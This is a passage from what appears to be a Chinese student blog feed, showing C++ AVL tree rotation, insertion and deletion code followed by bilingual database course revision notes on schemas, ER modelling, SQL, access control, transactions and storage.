<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">AVLTree <span class="title">LL_Rotation</span><span class="params">(AVLTree &amp;T)</span><span class="comment">//LL旋转</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    AVLTree temp=T-&gt;lchild;<span class="comment">//temp节点是B节点</span></span><br><span class="line">    T-&gt;lchild=temp-&gt;rchild;<span class="comment">//T3节点接到A节点的左子树</span></span><br><span class="line">    temp-&gt;rchild=T;<span class="comment">//A节点接到B节点的右子树</span></span><br><span class="line">    <span class="built_in">updateHeight</span>(T);<span class="comment">//更新高度</span></span><br><span class="line">    <span class="built_in">updateHeight</span>(temp);</span><br><span class="line">    <span class="keyword">return</span> temp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="RR旋转"><a href="#RR旋转" class="headerlink" title="RR旋转"></a>RR旋转</h4><p>RR型的概念理解如上，旋转方法是将A逆时针旋转取代B的左子树位置，将被抛弃的子树$T_2$放到A的右子树。</p>
<p><img src="https://s3.bmp.ovh/imgs/2022/11/28/bbb0eafce90fe8f4.png" alt=""></p>
<p>代码：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">AVLTree <span class="title">RR_Rotation</span><span class="params">(AVLTree &amp;T)</span><span class="comment">//RR旋转</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    AVLTree temp=T-&gt;rchild;</span><br><span class="line">    T-&gt;rchild=temp-&gt;lchild;</span><br><span class="line">    temp-&gt;lchild=T;</span><br><span class="line">    <span class="built_in">updateHeight</span>(T);<span class="comment">//更新高度</span></span><br><span class="line">    <span class="built_in">updateHeight</span>(temp);</span><br><span class="line">    <span class="keyword">return</span> temp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="LR旋转"><a href="#LR旋转" class="headerlink" title="LR旋转"></a>LR旋转</h4><p>LR旋转需要分两次旋转，首先是将B做RR型旋转，后将A做LL型旋转。注意一下这里图因为方便看是移动了C节点，但实际上就是移动B到C下面并将C左子树拼接到B右子树。</p>
<p><img src="https://s3.bmp.ovh/imgs/2022/11/28/7d7fc1ddd22ec9aa.png" alt=""></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">AVLTree <span class="title">LR_Rotation</span><span class="params">(AVLTree &amp;T)</span><span class="comment">//LR旋转</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">     T-&gt;lchild=<span class="built_in">RR_Rotation</span>(T-&gt;lchild);</span><br><span class="line">     <span class="keyword">return</span> <span class="built_in">LL_Rotation</span>(T);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="RL旋转"><a href="#RL旋转" class="headerlink" title="RL旋转"></a>RL旋转</h4><p>分两次旋转，B做L旋转，然后A再做R旋转。</p>
<p><img src="https://s3.bmp.ovh/imgs/2022/11/28/b1f9a9f7d4ae58a9.png" alt=""></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">AVLTree <span class="title">RL_Rotation</span><span class="params">(AVLTree &amp;T)</span><span class="comment">//RL旋转</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    T-&gt;rchild=<span class="built_in">LL_Rotation</span>(T-&gt;rchild);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">RR_Rotation</span>(T);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="算法步骤"><a href="#算法步骤" class="headerlink" title="算法步骤"></a>算法步骤</h3><ol>
<li>在平衡二叉树中寻找x，如果查找失败，执行插入操作</li>
<li>创建一个新节点p存储x，该节点双亲节点为f，高度为1。</li>
<li>从双亲节点f出发，向上寻找最近的不平衡节点，逐层检查，如平衡更新高度，不平衡则判断类型并调整平衡。</li>
</ol>
<p>插入节点代码：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">AVLTree <span class="title">Insert</span><span class="params">(AVLTree &amp;T,<span class="type">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(T==<span class="literal">NULL</span>) <span class="comment">//如果为空，创建新结点</span></span><br><span class="line">    &#123;</span><br><span class="line">        T=<span class="keyword">new</span> AVLNode;</span><br><span class="line">        T-&gt;lchild=T-&gt;rchild=<span class="literal">NULL</span>;</span><br><span class="line">        T-&gt;data=x;</span><br><span class="line">        T-&gt;height=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">return</span> T;</span><br><span class="line">     &#125;</span><br><span class="line">    <span class="keyword">if</span>(T-&gt;data==x) <span class="keyword">return</span> T;<span class="comment">//查找成功，什么也不做，查找失败时才插入</span></span><br><span class="line">    <span class="keyword">if</span>(x&lt;T-&gt;data)<span class="comment">//插入到左子树</span></span><br><span class="line">    &#123;</span><br><span class="line">        T-&gt;lchild=<span class="built_in">Insert</span>(T-&gt;lchild,x);<span class="comment">//注意插入后饭后结果挂接到T-&gt;lchild</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">Height</span>(T-&gt;lchild)-<span class="built_in">Height</span>(T-&gt;rchild)==<span class="number">2</span>)<span class="comment">//插入后看是否平衡，如果不平衡显然是插入的那一边高度大</span></span><br><span class="line">        &#123;                                         <span class="comment">//沿着高度大的那条路径判断</span></span><br><span class="line">            <span class="keyword">if</span>(x&lt;T-&gt;lchild-&gt;data)<span class="comment">//判断是LL还是LR,即插入的是lchild节点的lchild 还是rchild</span></span><br><span class="line">                T=<span class="built_in">LL_Rotation</span>(T);</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                T=<span class="built_in">LR_Rotation</span>(T);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span><span class="comment">//插入到右子树</span></span><br><span class="line">    &#123;</span><br><span class="line">        T-&gt;rchild=<span class="built_in">Insert</span>(T-&gt;rchild,x);</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">Height</span>(T-&gt;rchild)-<span class="built_in">Height</span>(T-&gt;lchild)==<span class="number">2</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(x&gt;T-&gt;rchild-&gt;data)</span><br><span class="line">                T=<span class="built_in">RR_Rotation</span>(T);</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                T=<span class="built_in">RL_Rotation</span>(T);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">updateHeight</span>(T);</span><br><span class="line">    <span class="keyword">return</span> T;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>删除节点代码：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">AVLTree <span class="title">adjust</span><span class="params">(AVLTree &amp;T)</span><span class="comment">//删除结点后，需要判断是否还是平衡，如果不平衡，就要调整</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(T==<span class="literal">NULL</span>) <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">Height</span>(T-&gt;lchild)-<span class="built_in">Height</span>(T-&gt;rchild)==<span class="number">2</span>)<span class="comment">//沿着高度大的那条路径判断</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">Height</span>(T-&gt;lchild-&gt;lchild)&gt;=<span class="built_in">Height</span>(T-&gt;lchild-&gt;rchild))</span><br><span class="line">            T=<span class="built_in">LL_Rotation</span>(T);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            T=<span class="built_in">LR_Rotation</span>(T);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">Height</span>(T-&gt;rchild)-<span class="built_in">Height</span>(T-&gt;lchild)==<span class="number">2</span>)<span class="comment">//沿着高度大的那条路径判断</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">Height</span>(T-&gt;rchild-&gt;rchild)&gt;=<span class="built_in">Height</span>(T-&gt;rchild-&gt;lchild))</span><br><span class="line">            T=<span class="built_in">RR_Rotation</span>(T);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            T=<span class="built_in">RL_Rotation</span>(T);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">updateHeight</span>(T);</span><br><span class="line">    <span class="keyword">return</span> T;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">AVLTree <span class="title">Delete</span><span class="params">(AVLTree &amp;T,<span class="type">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(T==<span class="literal">NULL</span>) <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span>(T-&gt;data==x)<span class="comment">//如果找到删除节点</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(T-&gt;rchild==<span class="literal">NULL</span>)<span class="comment">//如果该节点的右孩子为NULL,那么直接删除</span></span><br><span class="line">        &#123;</span><br><span class="line">            AVLTree temp=T;</span><br><span class="line">            T=T-&gt;lchild;</span><br><span class="line">            <span class="keyword">delete</span> temp;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span><span class="comment">//否则，将其右子树的最左孩子作为这个节点，并且递归删除这个节点的值</span></span><br><span class="line">        &#123;</span><br><span class="line">           AVLTree temp;</span><br><span class="line">           temp=T-&gt;rchild;</span><br><span class="line">           <span class="keyword">while</span>(temp-&gt;lchild)</span><br><span class="line">              temp=temp-&gt;lchild;</span><br><span class="line">           T-&gt;data=temp-&gt;data;</span><br><span class="line">           T-&gt;rchild=<span class="built_in">Delete</span>(T-&gt;rchild,T-&gt;data);</span><br><span class="line">           <span class="built_in">updateHeight</span>(T);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> T;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(T-&gt;data&gt;x)<span class="comment">//调节删除节点后可能涉及的节点</span></span><br><span class="line">        T-&gt;lchild=<span class="built_in">Delete</span>(T-&gt;lchild,x);</span><br><span class="line">    <span class="keyword">if</span>(T-&gt;data&lt;x)</span><br><span class="line">        T-&gt;rchild=<span class="built_in">Delete</span>(T-&gt;rchild,x);</span><br><span class="line">    <span class="built_in">updateHeight</span>(T);</span><br><span class="line">	T=<span class="built_in">adjust</span>(T);</span><br><span class="line">    <span class="keyword">return</span> T;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>基础</tag>
        <tag>算法</tag>
        <tag>C++</tag>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>数据库学习</title>
    <url>/2023/05/21/%E5%A4%A7%E4%BA%8C%E4%B8%8B%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%8D%E4%B9%A0/</url>
    <content><![CDATA[<h2 id="Week1"><a href="#Week1" class="headerlink" title="Week1"></a>Week1</h2><h3 id="four-main-types-of-actions-involve-databases"><a href="#four-main-types-of-actions-involve-databases" class="headerlink" title="four main types of actions involve databases"></a>four main types of actions involve databases</h3><ul>
<li><strong>Defining a database</strong>: It includes the data types, structures, and constraints of the data have to store in the database. The database descriptive information is also stored by the DBMS in the form of a database catalog or dictionary; it is called meta-data. </li>
<li><strong>Constructing the database</strong>: It is the process of data storing on some storage medium that is maintained by the DBMS. </li>
<li><strong>Manipulating a database</strong>: It includes functions such as retrieve the database by using query, updating the database to reflect changes in the system, and generate reports from the data. </li>
<li><strong>Sharing a database</strong>: It allows multiple users and programs to access the database simultaneously. </li>
</ul>
<h3 id="four-main-characteristics-of-the-database-approach-（四个数据库方法的主要特征）"><a href="#four-main-characteristics-of-the-database-approach-（四个数据库方法的主要特征）" class="headerlink" title="four main characteristics of the database approach. （四个数据库方法的主要特征）"></a>four main characteristics of the database approach. （四个数据库方法的主要特征）</h3><ul>
<li>self-describing nature of a database system（自描述性质）</li>
<li>insulation between programs and data（程序和数据间的隔离）</li>
<li>data abstraction（数据抽象）</li>
<li>support of multiple views of the data. （支持数据的多个视图）</li>
</ul>
<h3 id="The-differences-between-controlled-and-uncontrolled-redundancy（受控冗余和不受控冗余）"><a href="#The-differences-between-controlled-and-uncontrolled-redundancy（受控冗余和不受控冗余）" class="headerlink" title="The differences between controlled and uncontrolled redundancy（受控冗余和不受控冗余）"></a>The differences between controlled and uncontrolled redundancy（受控冗余和不受控冗余）</h3><p>Redundancy is the state of being not or no longer needed or useful. Uncontrolled redundancy in storing the same data or information many times in the database leads to several problems including duplication of effort, wastage of storage space and inconsistent data. Controlled redundancy is a technique to use redundant fields in a database. This speed up the database access and also improves the performance of queries. Usually, the DBMS ensures the allocation of the data in the records. It should have the capability to control this redundancy in order to prohibit inconsistencies among the files. </p>
<h2 id="Week2"><a href="#Week2" class="headerlink" title="Week2"></a>Week2</h2><h3 id="differences-between-a-database-schema-and-a-database-state-（数据库模式和数据库状态的区别）"><a href="#differences-between-a-database-schema-and-a-database-state-（数据库模式和数据库状态的区别）" class="headerlink" title="differences between a database schema and a database state. （数据库模式和数据库状态的区别）"></a>differences between a database schema and a database state. （数据库模式和数据库状态的区别）</h3><p>A database schema represents the overall design of the database. In contrast, the database state represents the current state of data in the database. The database schema is changed occasionally. The database state is changed frequently. Initially when defining a database, only thedatabase schema is specified. The database state is the empty state when the database is defined. </p>
<p><strong>answer:</strong></p>
<ul>
<li>A database schema represents the overall design of the database. In contrast, the database state represents the current state of data in the database.</li>
<li>The database schema is changed occasionally. In contrast, the database state is changed frequently.</li>
<li>Initially when defining a database, only the database schema is specified. The database state is the empty state when the database is defined.</li>
</ul>
<h3 id="differences-between-logical-data-independence-and-physical-data-independence-（逻辑数据独立性和物理数据独立性区别）"><a href="#differences-between-logical-data-independence-and-physical-data-independence-（逻辑数据独立性和物理数据独立性区别）" class="headerlink" title="differences between logical data independence and physical data independence. （逻辑数据独立性和物理数据独立性区别）"></a>differences between logical data independence and physical data independence. （逻辑数据独立性和物理数据独立性区别）</h3><p>Logical data independence is mainly concerned about the structure or the changing data definition. In contrast, physical data independence is mainly concerned about how the data is stored on the system. Any changes made at the logical level require a change at the application level. In contrast, any changes made at the physical level need not be made at the application level. The conceptual schema is the primary concern in achieving logical data independence. In contrast, the internal schema is the primary concern in achieving physical data independence. Achieving physical data independence is much easier as compared to logical data independence. In contrast, achieving logical data independence is more difficult as compared to physical data independence. </p>
<h3 id="Why-logical-data-independence-is-harder-to-achieve-compared-to-physical-data-independence"><a href="#Why-logical-data-independence-is-harder-to-achieve-compared-to-physical-data-independence" class="headerlink" title="Why logical data independence is harder to achieve compared to physical data independence?"></a>Why logical data independence is harder to achieve compared to physical data independence?</h3><p>Logical data independence is harder to achieve as the application programs are heavily dependent on the logical format of the data they access. Hence, a change at the conceptual level might require changing the entire program application. When it comes to physical data independence, a change in the location of the database or modifying the file organisation or use of new storage devices will not require change at the higher logical levels. </p>
<p><strong>Answer:</strong></p>
<ul>
<li>Logical data independence is harder to achieve as the application programs are heavily dependent on the logical format of the data they access</li>
<li>Hence, a change at the conceptual level might require changing the entire program application. </li>
<li>When it comes to physical data independence, a change in the location of the database or modifying the file organisation or use of new storage devices will not require change at the higher logical levels.</li>
</ul>
<h3 id="procedural-and-non-procedural-data-manipulation-languages-（程序性数据操作语言和非程序性操作语言）"><a href="#procedural-and-non-procedural-data-manipulation-languages-（程序性数据操作语言和非程序性操作语言）" class="headerlink" title="procedural and non-procedural data manipulation languages.（程序性数据操作语言和非程序性操作语言）"></a>procedural and non-procedural data manipulation languages.（程序性数据操作语言和非程序性操作语言）</h3><ul>
<li>In terms of the mode of operation of a procedural DML, a programmer needs to provide a sequential set of instructions regarding what the system needs to perform and how it needs to perform them In contrast, a programmer only needs to provide the information regarding what the system need to d and not how to do it when using a non-procedural DML. </li>
<li>In terms of language driving, a procedural DML is a command-driven kind of programming language. In contrast, a non-procedural DML is a function-kind of programming language. </li>
<li>In terms of the approach, a procedural DML is mainly aimed at solving a particular set of available problems. In contrast, a non-procedural DML is a domain-specific type of language. </li>
<li>In terms of dependency, a procedural DML mainly depends on the execution order. In contrast, a non procedural DML mainly depends on the parameter’s values from the given function. </li>
<li>In terms of writing of language, a procedural DML is written in the form of a set of the required instructions. In contrast, a non-procedural DML is written in the form of natural instructions of a language. </li>
</ul>
<h2 id="Week3"><a href="#Week3" class="headerlink" title="Week3"></a>Week3</h2><h3 id="two-cases-where-use-of-a-NULL-value-would-be-appropriate"><a href="#two-cases-where-use-of-a-NULL-value-would-be-appropriate" class="headerlink" title="two cases where use of a NULL value would be appropriate."></a>two cases where use of a NULL value would be appropriate.</h3><p>Setting a NULL value is appropriate when the actual value is <strong>unknown</strong>, or when <strong>a value would not be meaningful</strong>. </p>
<h3 id="the-differences-among-an-entity-an-entity-type-and-an-entity-set-（实体，实体类型，实体集合）"><a href="#the-differences-among-an-entity-an-entity-type-and-an-entity-set-（实体，实体类型，实体集合）" class="headerlink" title="the differences among an entity, an entity type, and an entity set. （实体，实体类型，实体集合）"></a>the differences among an entity, an entity type, and an entity set. （实体，实体类型，实体集合）</h3><p>An entity is a thing in the real world with independent existence. An entity type is a category of a particular entity. An entity set is the set of all entities of a particular entity type. </p>
<h3 id="differences-between-an-attribute-and-a-value-set-属性和值集的区别"><a href="#differences-between-an-attribute-and-a-value-set-属性和值集的区别" class="headerlink" title="differences between an attribute and a value set (属性和值集的区别)"></a>differences between an attribute and a value set (属性和值集的区别)</h3><p>Attributes describe the instances in the row of a database. For example, attributes in an invoice can be price, invoice number and date. A value set specifies the set of values that may be assigned to that attribute for each individual entity. </p>
<h3 id="two-conditions-where-an-attribute-of-a-binary-relationship-type-can-be-migrated-to-become-an-attribute-of-one-of-the-participating-entity-types"><a href="#two-conditions-where-an-attribute-of-a-binary-relationship-type-can-be-migrated-to-become-an-attribute-of-one-of-the-participating-entity-types" class="headerlink" title="two conditions where an attribute of a binary relationship type can be migrated to become an attribute of one of the participating entity types."></a>two conditions where an attribute of a binary relationship type can be migrated to become an attribute of one of the participating entity types.</h3><p>The attributes of 1:1 or 1:N relationship types can be migrated to one of the participating entity types. In case of 1:1 cardinality, attributes can be moved to either of entity types in binary relationship. In case of 1:N cardinality, attributes can be migrated only to N side of relationship. In both 1:1 and I:N relationship types, the decision as to where a relationship attribute should be placed – as a relationship type attribute or as an attribute of a participating entity type – is determined subjectively by the schema designer. For relationship types with cardinality M:N, attributes cannot be migrated to become attributes of one of participating entity types. </p>
<h3 id="two-examples-of-recursive-relationship-types-（递归关系类型）"><a href="#two-examples-of-recursive-relationship-types-（递归关系类型）" class="headerlink" title="two examples of recursive relationship types.（递归关系类型）"></a>two examples of recursive relationship types.（递归关系类型）</h3><p> The first example of a recursive relationship type is the supervisor employee relationship. An employee can supervise multiple employees. Hence, it is a recursive relationship of entity EMPLOYEE with itself. This is a one-to-many recursive relationship as one employee supervises many employees. The second example of a recursive relationship type is the class leader and students. A student can be a class leader and handle other students but a person who is working as a class leader is itself a student of the class. Hence, a class leader has a recursive relationship of entity STUDENT with itself. </p>
<h2 id="Week16"><a href="#Week16" class="headerlink" title="Week16"></a>Week16</h2><h3 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h3><p>SQL is a very large and powerful language, but every type of SQL statement falls withinone of three main categories (or sub-languages):</p>
<p>• <strong>Data Definition Language</strong> (DDL) for creating a DB<br>CREATE , DROP , ALTER</p>
<p>• <strong>Data Control Language</strong> (DCL) for administering a DB<br>GRANT , DENY , USE</p>
<p>• <strong>Data Manipulation Language</strong> (DML) to access a DB<br>SELECT , INSERT , UPDATE , DELETE</p>
<h3 id="Brieflfly-explain-what-an-ontology-and-a-database-schema-are-and-discuss-one-similarity-between-the-two-（本体论和数据库模式的区别）"><a href="#Brieflfly-explain-what-an-ontology-and-a-database-schema-are-and-discuss-one-similarity-between-the-two-（本体论和数据库模式的区别）" class="headerlink" title="Brieflfly explain what an ontology and a database schema are and discuss one similarity between the two.（本体论和数据库模式的区别）"></a>Brieflfly explain what an ontology and a database schema are and discuss one similarity between the two.（本体论和数据库模式的区别）</h3><ul>
<li>An ontology is a model that clarifies and specifies a set of meanings in a formal language. Those meanings reflect the ontologist’s understanding of the target subject matter, regarding the kinds of things there are and how those things are related to each other.</li>
<li>A database schema defines the structure of a database in a formal language. There are three kinds of database schemas: conceptual, logical and physical. </li>
<li>The fundamental similarity between an ontology and a database schema is that, at the conceptual level, both consist of set of type definitions expressed in a formal notation.</li>
</ul>
<h3 id="Discuss-insertion-deletion-and-modification-anomalies-Why-are-they-considered-bad-（插入，删除，修改异常为什么认为是不好的）"><a href="#Discuss-insertion-deletion-and-modification-anomalies-Why-are-they-considered-bad-（插入，删除，修改异常为什么认为是不好的）" class="headerlink" title="Discuss insertion, deletion, and modification anomalies. Why are they considered bad?（插入，删除，修改异常为什么认为是不好的）"></a>Discuss insertion, deletion, and modification anomalies. Why are they considered bad?（插入，删除，修改异常为什么认为是不好的）</h3><ul>
<li>Anomalies are considered to be bad in the sense that they create dirty data that would be incomplete and inconsistent.</li>
<li>Moreover, improper insertion, deletion, or update operations will violate the integrity properties.</li>
<li>Thus, the entire database would be inconsistent.</li>
</ul>
<h3 id="Discuss-the-problem-of-spurious-tuples-and-how-we-may-prevent-it-（伪元组）"><a href="#Discuss-the-problem-of-spurious-tuples-and-how-we-may-prevent-it-（伪元组）" class="headerlink" title="Discuss the problem of spurious tuples and how we may prevent it.（伪元组）"></a>Discuss the problem of spurious tuples and how we may prevent it.（伪元组）</h3><ul>
<li>A spurious tuple is mainly a record in a database that gets created while two tables are joined badly.</li>
<li>In a database, spurious tuples are formed while two tables are joined on attributes which are neither primary nor foreign keys. To prevent spurious tuples, avoid joining relations that consist of matching attributes that are not primary or foreign key combinations as joining on such attributes may generate spurious tuples.</li>
</ul>
<h3 id="Why-should-NULLs-in-a-relation-be-avoided-as-much-as-possible"><a href="#Why-should-NULLs-in-a-relation-be-avoided-as-much-as-possible" class="headerlink" title="Why should NULLs in a relation be avoided as much as possible?"></a>Why should NULLs in a relation be avoided as much as possible?</h3><ul>
<li>NULLs should be avoided to avoid complexity in SELECT and UPDATE queries. </li>
<li>Furthermore, columns which have constraints like primary or foreign key constraints cannot contain a NULL value.</li>
</ul>
<h3 id="What-is-meant-by-granting-a-privilege-What-is-meant-by-revoking-a-privilege-（给予和撤销权限）"><a href="#What-is-meant-by-granting-a-privilege-What-is-meant-by-revoking-a-privilege-（给予和撤销权限）" class="headerlink" title="What is meant by granting a privilege? What is meant by revoking a privilege?（给予和撤销权限）"></a>What is meant by granting a privilege? What is meant by revoking a privilege?（给予和撤销权限）</h3><ul>
<li>Granting and revoking privileges is a task that you would perform when you want to allow or disallow users of the database to be able to reference data within the database as part of a security practice. </li>
<li>The GRANT privilege statement grants privileges on the database as a whole or on individual tables, views, sequences or procedures.</li>
<li>It controls access to database objects, roles and DBMS resources. The REVOKE statement revokes privileges. It removes database privileges or role access granted to the specified users, groups, role or PUBLIC.</li>
<li>You cannot revoke privileges granted by other users.</li>
</ul>
<h3 id="What-is-the-difference-between-discretionary-and-mandatory-access-control-（自由权限和强制权限）"><a href="#What-is-the-difference-between-discretionary-and-mandatory-access-control-（自由权限和强制权限）" class="headerlink" title="What is the difference between discretionary and mandatory access control?（自由权限和强制权限）"></a>What is the difference between discretionary and mandatory access control?（自由权限和强制权限）</h3><ul>
<li>In mandatory access control, the system and not the users, determines which subjects can access specific data objects.</li>
<li>Discretionary access control is different from mandatory access control because the owner of the data object specifies which subjects can access the data object.</li>
</ul>
<h3 id="What-is-meant-by-row-level-access-control-（行级权限控制）"><a href="#What-is-meant-by-row-level-access-control-（行级权限控制）" class="headerlink" title="What is meant by row-level access control?（行级权限控制）"></a>What is meant by row-level access control?（行级权限控制）</h3><ul>
<li>Row level access control refers to the practice of controlling access to data in a database by row, so that users are only able to access the data they are authorized for.</li>
<li>This contrasts with database-level or table-level access control, which controls access to entire databases or tables, respectively.</li>
</ul>
<h3 id="Discuss-the-atomicity-durability-isolation-and-consistency-preservation-properties-of-a-database-transaction-（原子性，持久性，隔离性，一致性）"><a href="#Discuss-the-atomicity-durability-isolation-and-consistency-preservation-properties-of-a-database-transaction-（原子性，持久性，隔离性，一致性）" class="headerlink" title="Discuss the atomicity, durability, isolation, and consistency preservation properties of a database transaction.（原子性，持久性，隔离性，一致性）"></a>Discuss the atomicity, durability, isolation, and consistency preservation properties of a database transaction.（原子性，持久性，隔离性，一致性）</h3><ul>
<li>Atomicity is a property that ensures that a database follows the all or nothing rule.  In other words, the database considers all transaction operations as one whole unit or atom.</li>
<li>Consistency is a property ensuring that only valid data following all rules and constraints is written in the database.  When a transaction results in invalid data, the database reverts to its previous state, which abides by all customary rules and constraints.</li>
<li>Isolation is a property that guarantees the individuality of each transaction, and prevents them from being affected from other transactions. It ensures that transactions are securely and independently processed at the same time without interference, but it does not ensure the order of transactions.</li>
<li>Durability is a property that enforces completed transactions, guaranteeing that once each one of them has been committed, it will remain in the system even in case of subsequent failures. These failures include transaction failures and catastrophic failures.</li>
</ul>
<h3 id="What-is-a-serial-schedule-What-is-a-serialisable-schedule-Why-is-a-serial-schedule-considered-correct-Why-is-a-serialisable-schedule-considered-correct-（串行调度和可串行调度）"><a href="#What-is-a-serial-schedule-What-is-a-serialisable-schedule-Why-is-a-serial-schedule-considered-correct-Why-is-a-serialisable-schedule-considered-correct-（串行调度和可串行调度）" class="headerlink" title="What is a serial schedule? What is a serialisable schedule? Why is a serial schedule considered correct? Why is a serialisable schedule considered correct?（串行调度和可串行调度）"></a>What is a serial schedule? What is a serialisable schedule? Why is a serial schedule considered correct? Why is a serialisable schedule considered correct?（串行调度和可串行调度）</h3><ul>
<li>A serial schedule is a type of schedule where one transaction is executed completely before starting another transaction. A serial schedule always gives the correct result. Consider two transactions <em>T</em>1 and <em>T</em>2 which perform some operations. If it has no interleaving of operations, then there are two possible outcomes: either execute all of <em>T</em>1 operations, which were followed by <em>T</em>2 operations. </li>
<li>A serialisable schedule is a non-schedule serial that can be converted to its equivalent serial schedule. In other words, if a non-serial schedule and a serial schedule result in the same, then the non-serial schedule is called a serialisable schedule. A serialisable schedule is accepted as correct because the database is not influenced by the concurrent execution of the transactions.（数据库不受并发事务的影响）</li>
</ul>
<h3 id="Discuss-the-actions-taken-by-the-read-item-modify-item-and-write-item-operations-on-a-database"><a href="#Discuss-the-actions-taken-by-the-read-item-modify-item-and-write-item-operations-on-a-database" class="headerlink" title="Discuss the actions taken by the read_item, modify_item and write_item operations on a database."></a>Discuss the actions taken by the <em>read_item</em>, <em>modify_item</em> and <em>write_item</em> operations on a database.</h3><ul>
<li>The <em>read item</em> operation reads a data item from storage to main memory. The <em>modify item</em> operation changes the value of item in the main memory. The <em>write item</em> operation writes the modified value from main memory to storage. </li>
</ul>
<h3 id="Define-the-violations-caused-by-each-of-the-following-a-dirty-read-and-b-phantoms-（脏读取和幻象）"><a href="#Define-the-violations-caused-by-each-of-the-following-a-dirty-read-and-b-phantoms-（脏读取和幻象）" class="headerlink" title="Define the violations caused by each of the following: (a) dirty read, and (b) phantoms.（脏读取和幻象）"></a>Define the violations caused by each of the following: (a) dirty read, and (b) phantoms.（脏读取和幻象）</h3><ul>
<li>A dirty read occurs if one transaction reads data that has been modified by another transaction. [<strong>1 mark</strong>] This results in a violation of transaction isolation, if the transaction that modified the data is rolled back. [<strong>1 mark</strong>] A phantom read occurs when a transaction retrieves a set of rows twice [<strong>1 mark</strong>] and new rows are inserted or removed from that set by another transaction that is committed in between. [<strong>1 mark</strong>]</li>
</ul>
<h3 id="Describe-two-differences-between-primary-and-secondary-storage-（一次存储和二次存储）"><a href="#Describe-two-differences-between-primary-and-secondary-storage-（一次存储和二次存储）" class="headerlink" title="Describe two differences between primary and secondary storage. （一次存储和二次存储）"></a>Describe two differences between primary and secondary storage. （一次存储和二次存储）</h3><ul>
<li>Primary storage is the computer’s main memory and stores data temporarily. Secondary storage is external memory and saves data permanently. Data stored in primary storage can be directly accessed by the CPU, which cannot be accessed in secondary storage.</li>
</ul>
<h3 id="Explain-two-techniques-for-allocating-file-blocks-on-a-disk-in-detail-（磁盘分配文件块）"><a href="#Explain-two-techniques-for-allocating-file-blocks-on-a-disk-in-detail-（磁盘分配文件块）" class="headerlink" title="Explain two techniques for allocating file blocks on a disk in detail.（磁盘分配文件块）"></a>Explain two techniques for allocating file blocks on a disk in detail.（磁盘分配文件块）</h3><ul>
<li>contiguous file allocation and linked file allocation. （连续文件分配和链接文件分配）</li>
<li>In contiguous file allocation, the block is allocated in such a manner that all the allocated blocks in the hard disk are adjacent. [<strong>1 mark</strong>] Assuming a file needs <em>n</em> number of blocks in the disk and the file begins with a block at position <em>x</em>, the next blocks to be assigned to it will be <em>x</em> + 1, <em>x</em> + 2, <em>x</em> + 3, …, <em>x</em> + <em>n</em>–1 so that they are in a contiguous manner. </li>
<li>In linked file allocation, the file which we store on the hard disk is stored in a scattered manner according to the space available on the hard disk. [<strong>1 mark</strong>] To remember the blocks that belong to the same file, the linked file allocation technique uses pointers to point to the next block of the same file. [<strong>1 mark</strong>] Therefore, along with the entry of each file each block also stores the pointer to the next block.</li>
</ul>
<h3 id="Explain-how-double-buffering-improves-block-access-time-（双缓冲提高访问时间）"><a href="#Explain-how-double-buffering-improves-block-access-time-（双缓冲提高访问时间）" class="headerlink" title="Explain how double buffering improves block access time. （双缓冲提高访问时间）"></a>Explain how double buffering improves block access time. （双缓冲提高访问时间）</h3><ul>
